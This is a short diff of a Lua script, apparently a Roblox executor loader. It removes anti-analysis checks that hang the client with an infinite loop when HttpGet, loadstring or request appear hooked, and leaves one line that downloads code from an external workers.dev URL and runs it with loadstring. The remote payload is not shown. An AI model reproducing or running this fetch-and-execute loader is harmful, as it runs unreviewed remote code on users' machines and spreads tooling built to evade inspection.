@@ -1,17 +1,1 @@
-spawn(function()
-    local function isHooked(func)
-        return not pcall(function() return tostring(func) end)
-    end
-
-    if isHooked(game.HttpGet) or isHooked(loadstring) or isHooked(request) then
-        while true do end
-    end
-end)
-
-spawn(function()
-    if not islclosure(game.HttpGet) then
-        while true do end
-    end
-end)
-
 loadstring(game:HttpGet("https://loader.4ltsh0lder.workers.dev/"))()
